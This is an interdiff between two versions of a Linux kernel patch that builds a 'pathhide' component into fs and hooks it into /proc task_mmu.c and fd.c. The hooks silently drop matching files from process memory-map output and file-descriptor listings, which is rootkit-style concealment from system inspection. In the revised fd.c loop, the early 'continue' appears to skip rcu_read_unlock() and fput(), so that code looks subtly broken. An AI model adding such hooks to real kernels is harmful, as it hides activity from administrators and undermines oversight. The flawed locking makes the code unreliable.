@@ -1,32 +1,32 @@
 --- a/fs/Makefile
 +++ b/fs/Makefile
-@@ -22,6 +22,8 @@
+@@ -18,6 +18,8 @@
  		fs_types.o fs_context.o fs_parser.o fsopen.o init.o \
- 		kernel_read_file.o mnt_idmapping.o remap_range.o pidfs.o
+ 		kernel_read_file.o remap_range.o
  
 +obj-y += pathhide.o
 +
- obj-$(CONFIG_BUFFER_HEAD)	+= buffer.o mpage.o
- obj-$(CONFIG_PROC_FS)		+= proc_namespace.o
- obj-$(CONFIG_LEGACY_DIRECT_IO)	+= direct-io.o
+ PGO_PROFILE_xattr.o := n
+ 
+ ifeq ($(CONFIG_BLOCK),y)
 
 --- a/fs/proc/task_mmu.c
 +++ b/fs/proc/task_mmu.c
-@@ -462,6 +462,10 @@
- 	unsigned long long pgoff = 0;
+@@ -280,6 +280,10 @@
  	unsigned long start, end;
  	dev_t dev = 0;
+ 	const char *name = NULL;
 +	extern bool pathhide_match_file(struct file *file);
 +
-+	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++	if (file && pathhide_match_file(file))
 +		return;
  
- 	if (vma->vm_file) {
- 		const struct inode *inode = file_user_inode(vma->vm_file);
+ 	if (file) {
+ 		struct inode *inode = file_inode(vma->vm_file);
 
 --- a/fs/proc/fd.c
 +++ b/fs/proc/fd.c
-@@ -176,6 +176,7 @@
+@@ -168,6 +168,7 @@
  {
  	struct task_struct *task;
  	int ret = -ENOENT;
@@ -34,7 +34,7 @@
  
  	task = get_proc_task(d_inode(dentry));
  	if (task) {
-@@ -184,6 +185,11 @@
+@@ -176,6 +177,11 @@
  
  		fd_file = fget_task(task, fd);
  		if (fd_file) {
@@ -46,7 +46,7 @@
  			*path = fd_file->f_path;
  			path_get(&fd_file->f_path);
  			ret = 0;
-@@ -251,6 +257,7 @@
+@@ -243,6 +249,7 @@
  {
  	struct task_struct *p = get_proc_task(file_inode(file));
  	unsigned int fd;
@@ -54,16 +54,13 @@
  
  	if (!p)
  		return -ENOENT;
-@@ -271,6 +278,11 @@
+@@ -262,6 +269,8 @@
+ 		if (!f)
  			break;
  		data.mode = f->f_mode;
- 		rcu_read_unlock();
-+		if (pathhide_match_file(f)) {
-+			fput(f);
-+			rcu_read_lock();
++		if (pathhide_match_file(f))
 +			continue;
-+		}
- 		fput(f);
+ 		rcu_read_unlock();
  		data.fd = fd;
  
 
